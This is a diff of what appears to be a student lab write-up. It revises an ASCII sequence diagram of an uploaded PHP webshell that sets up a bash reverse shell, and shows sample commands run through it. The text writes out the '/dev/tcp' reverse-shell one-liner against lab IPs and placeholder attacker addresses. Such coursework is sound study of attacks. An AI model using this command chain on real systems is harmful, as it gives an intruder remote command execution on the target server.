@@ -85,54 +85,82 @@ Those codes are special character alternatives that are used for the url, becaus
 http://192.168.64.2/webshell.php?command=bash -c "bash -i >& /dev/tcp/192.168.64.1/8000 0>&1"
 ```
 
-**g. Write a brief description, probably including a diagram, explaining how this reverse shell is functioning.** \
+**g. Write a brief description, probably including a diagram, explaining how this reverse shell is functioning.**
 
 ```
-         ┌─┐                                                                                                      ┌─┐     
-         ║"│                                                                                                      ║"│     
-         └┬┘                                                                                                      └┬┘     
-         ┌┼┐                                                                                                      ┌┼┐     
-          │                                                             ┌──────┐                                   │      
-         ┌┴┐                                                            │Server│                                  ┌┴┐     
-      Attacker                                                          └───┬──┘                                Target    
-          │                                                                 │  "Opens up a server to the world"    │      
-          │                                                                 │<─────────────────────────────────────│      
-          │                                                                 │                                      │      
-          │     "Writes and uploads a php script that allows the            │                                      │      
-          │      attacker to run their own php commands on the server"      │                                      │      
-          │────────────────────────────────────────────────────────────────>│                                      │      
-          │                                                                 │                                      │      
-          │────┐                                                            │                                      │      
-          │    │ "Opens up a listening port to accept incoming connections" │                                      │      
-          │<───┘                                                            │                                      │      
-          │                                                                 │                                      │      
-          │     "Executes: http://192.168.64.2/webshell.php?command=        │                                      │      
-          │      bash -c "bash -i >& /dev/tcp/192.168.64.1/8000 0>&1"       │                                      │      
-          │────────────────────────────────────────────────────────────────>│                                      │      
-          │                                                                 │                                      │      
-          │                                                                 │"Executes the command on the server   │      
-          │                                                                 │ hosts machine (i.e. target machine)" │      
-          │                                                                 │─────────────────────────────────────>│      
-          │                                                                 │                                      │      
-          │                                                                 │ ╔════════════════════════════════════╧═════╗
-          │                                                                 │ ║"This command in specific runs the       ░║
-          │                                                                 │ ║ following bash cmd 'bash -i >&           ║
-          │                                                                 │ ║ /dev/tcp/192.168.64.1/8000 0>&1'         ║
-          │                                                                 │ ║ which then establishes a reverse shell   ║
-          │                                                                 │ ║ connection back to the attacker's        ║
-          │                                                                 │ ║ machine, allowing the attacker to exec   ║
-          │                                                                 │ ║ commands via their nc instance"          ║
-          │                                                                 │ ╚════════════════════════════════════╤═════╝
-          │                                        "Connection is created"  │                                      │      
-          │<───────────────────────────────────────────────────────────────────────────────────────────────────────│      
-          │                                                                 │                                      │      
-          │                               "Various types of attacks possibly occur"                                │      
-          │───────────────────────────────────────────────────────────────────────────────────────────────────────>│      
-      Attacker                                                          ┌───┴──┐                                Target    
-         ┌─┐                                                            │Server│                                  ┌─┐     
-         ║"│                                                            └──────┘                                  ║"│     
-         └┬┘                                                                                                      └┬┘     
-         ┌┼┐                                                                                                      ┌┼┐     
-          │                                                                                                        │      
-         ┌┴┐                                                                                                      ┌┴┐     
+         ┌─┐                                                                                                    ┌─┐       
+         ║"│                                                                                                    ║"│       
+         └┬┘                                                                                                    └┬┘       
+         ┌┼┐                                                                                                    ┌┼┐       
+          │                                                           ┌──────┐                                   │        
+         ┌┴┐                                                          │Server│                                  ┌┴┐       
+      Attacker                                                        └───┬──┘                                Target      
+          │                                                               │   Opens up a server to the world     │        
+          │                                                               │<─────────────────────────────────────│        
+          │                                                               │                                      │        
+          │    Writes and uploads a php script that allows the            │                                      │        
+          │     attacker to run their own php commands on the server      │                                      │        
+          │──────────────────────────────────────────────────────────────>│                                      │        
+          │                                                               │                                      │        
+          │────┐                                                          │                                      │        
+          │    │ Opens up a listening port to accept incoming connections │                                      │        
+          │<───┘                                                          │                                      │        
+          │                                                               │                                      │        
+          │Inputs: http://Target_IP/webshell.php?command=                 │                                      │        
+          │ bash -c "bash -i >& /dev/tcp/Attacker_IP/Attacker_Port 0>&1"  │                                      │        
+          │──────────────────────────────────────────────────────────────>│                                      │        
+          │                                                               │                                      │        
+          │ ╔═════════════════════════════════════════════════════════════╗                                      │        
+          │ ║Note: You will need to replace sensitive/special url chars  ░║                                      │        
+          │ ║ with their appropriate codes                                ║                                      │        
+          │ ╚═════════════════════════════════════════════════════════════╝                                      │        
+          │                                                               │Executes the command on the server    │        
+          │                                                               │ host's machine (i.e. target machine) │        
+          │                                                               │─────────────────────────────────────>│        
+          │                                                               │                                      │        
+          │                                                               │ ╔════════════════════════════════════╧═══════╗
+          │                                                               │ ║This command in specific runs the          ░║
+          │                                                               │ ║ following bash cmd 'bash -i >&             ║
+          │                                                               │ ║ /dev/tcp/Attacker_IP/Attacker_Port 0>&1'   ║
+          │                                                               │ ║ which then establishes a reverse shell     ║
+          │                                                               │ ║ connection back to the attacker's          ║
+          │                                                               │ ║ machine, allowing the attacker to exec     ║
+          │                                                               │ ║ commands via their nc instance             ║
+          │                                                               │ ╚════════════════════════════════════╤═══════╝
+          │                                    netcat connection is created                                      │        
+          │<─────────────────────────────────────────────────────────────────────────────────────────────────────│        
+          │                                                               │                                      │        
+          │ ╔═════════════════════════════════════════════════╗           │                                      │        
+          │ ║Various types of attacks can now possibly occur ░║           │                                      │        
+          │ ╚═════════════════════════════════════════════════╝           │                                      │        
+          │                                               whoami          │                                      │        
+          │─────────────────────────────────────────────────────────────────────────────────────────────────────>│        
+          │                                                               │                                      │        
+          │                                              www-data         │                                      │        
+          │<─────────────────────────────────────────────────────────────────────────────────────────────────────│        
+          │                                                               │                                      │        
+          │                                                 pwd           │                                      │        
+          │─────────────────────────────────────────────────────────────────────────────────────────────────────>│        
+          │                                                               │                                      │        
+          │                                            /var/www/html      │                                      │        
+          │<─────────────────────────────────────────────────────────────────────────────────────────────────────│        
+          │                                                               │                                      │        
+          │                                                 ls            │                                      │        
+          │─────────────────────────────────────────────────────────────────────────────────────────────────────>│        
+          │                                                               │                                      │        
+          │                          index.html  index.nginx-debian.html  webshell.php                           │        
+          │<─────────────────────────────────────────────────────────────────────────────────────────────────────│        
+          │                                                               │                                      │        
+          │                                                 ...           │                                      │        
+          │─────────────────────────────────────────────────────────────────────────────────────────────────────>│        
+          │                                                               │                                      │        
+          │                                                 ...           │                                      │        
+          │<─────────────────────────────────────────────────────────────────────────────────────────────────────│        
+      Attacker                                                        ┌───┴──┐                                Target      
+         ┌─┐                                                          │Server│                                  ┌─┐       
+         ║"│                                                          └──────┘                                  ║"│       
+         └┬┘                                                                                                    └┬┘       
+         ┌┼┐                                                                                                    ┌┼┐       
+          │                                                                                                      │        
+         ┌┴┐                                                                                                    ┌┴┐       
 ```
